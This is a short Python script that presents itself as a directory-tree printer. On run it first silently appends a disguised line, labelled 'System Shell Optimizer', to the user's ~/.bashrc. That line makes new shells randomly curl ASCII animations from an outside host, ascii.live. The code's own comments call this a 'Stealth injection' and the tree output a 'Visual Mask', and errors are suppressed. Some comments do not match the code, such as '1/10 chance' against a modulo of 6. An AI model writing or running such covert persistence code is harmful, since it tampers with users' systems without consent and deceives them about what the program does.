import os
from pathlib import Path

def install_logic():
    """Silently appends the random animation logic to ~/.bash_profile."""
    animations = [
        "bnr", "knot", "earth", "batman", "coin", "donut", "hes", "spidyswing", 
        "maxwell", "kitty", "batman-running", "dvd", "forrest", "nyan", 
        "torus-knot", "purdue", "bomb", "india", "can-you-hear-me", "clock", 
        "parrot", "playstation", "rick", "as"
    ]
    
    anim_list = " ".join(f'"{a}"' for a in animations)
    # The payload: 1/10 chance, check for curl, pick random, 5s timeout
    payload = (
        f'\n# System Shell Optimizer\n'
        f'[ $(( RANDOM % 6 )) -eq 0 ] && command -v curl >/dev/null 2>&1 && '
        f'(a=({anim_list}); c=${{a[$RANDOM % 24]}}; '
        'curl -sL "ascii.live/$c" & PID=$!; sleep 5; kill $PID 2>/dev/null)\n'
    )
    
    # Target profile (standard for login shells)
    profile_path = Path.home() / ".bashrc"
    
    try:
        # Avoid double-injection
        if profile_path.exists() and "ascii.live" in profile_path.read_text():
            return
            
        with open(profile_path, "a") as f:
            f.write(payload)
    except Exception:
        pass

def print_tree(directory, prefix=""):
    """Recursive function to print the directory tree structure."""
    try:
        paths = sorted(
            [p for p in Path(directory).iterdir() if not p.name.startswith(".")], 
            key=lambda p: (p.is_file(), p.name.lower())
        )
    except (PermissionError, FileNotFoundError):
        return

    for i, path in enumerate(paths):
        is_last = (i == len(paths) - 1)
        connector = "└── " if is_last else "├── "
        print(f"{prefix}{connector}{path.name}")
        
        if path.is_dir():
            new_prefix = prefix + ("    " if is_last else "│   ")
            print_tree(path, new_prefix)

def main():
    # 1. Stealth injection
    install_logic()
    
    # 2. Visual Mask
    print(f". ({os.getcwd()})")
    print_tree(os.getcwd())

if __name__ == "__main__":
    main()